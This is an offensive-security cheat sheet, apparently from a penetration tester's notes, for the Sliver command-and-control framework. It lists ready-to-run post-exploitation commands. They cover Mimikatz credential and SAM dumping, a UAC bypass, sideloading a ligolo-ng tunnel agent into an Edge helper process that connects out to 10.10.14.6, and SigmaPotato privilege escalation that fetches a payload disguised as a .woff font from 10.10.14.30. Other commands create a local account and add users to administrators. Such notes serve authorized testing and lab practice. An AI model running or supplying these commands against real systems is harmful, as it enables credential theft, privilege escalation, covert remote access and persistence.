# sliver

% sliver, C2

## tools - mimikatz
```bash
mimikatz -t 3600 -- '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords /all" "lsadump::sam" "exit"'
```

## tools - registry - read value
```bash
registry read -H <hive|HKLM> "<registry_path>\<registry_value_name>"
```

## tools - registry - write value
```bash
registry write -H <hive|HKLM> --type <registry_value_type|dword> "<registry_path>\<registry_value_name>" <registry_valye_data>
```


## tools - registry - create
```bash
registry create -H <hive|HKLM> -"<registry_path>"
```

## tools - registry - list-subkeys
```bash
registry list-subkeys -H <hive|HKLM> "<registry_path>"
```

## tools - registry - list-values
```bash
registry list-values -H <hive|HKLM> "<registry_path>"
```

## tools - registry - UAC (prompt)
```bash
registry read -H HKLM "Software\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin"
```

## tools - registry - UAC (prompt)
```bash
registry read -H HKLM Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA
```

## tools - bypass UAC
https://github.com/0xb11a1/sliver_extension_uac_bypass_cmstp
```bash
uac_bypass_cmstp <path_to_exe>
```


## tools - slideload ligolo-ng agent 
```bash
sideload -k --process "C:\Program Files (x86)\Microsoft\Edge\Application\126.0.2592.102\identity_helper.exe" /home/jubeaz/tmp/ligolo-ng-agent.exe -ignore-cert -connect 10.10.14.6:11601
```


## tools - sigmapotato
```bash
execute-assembly /srv/http/upload/lib/SigmaPotato.exe '"c:\tmp\SlvrCT.exe -m -c zlib -e RChIK0tiUGVTaFZtWXEzdDZ2OXkkQiZFKUhATWNRZlQ=  http://10.10.14.30/sl_cyber/jubeaz.woff"'
```

## tools - add user to group
```bash
remote-addusertogroup  <domain> <computer> <user> <group|administrators>
```

## tools - create local account
```bash
remote-adduser jubeaz Zaebuj12345+- ""
```


## tools - powershell
```bash
execute -o powershell -e <base64enc>
```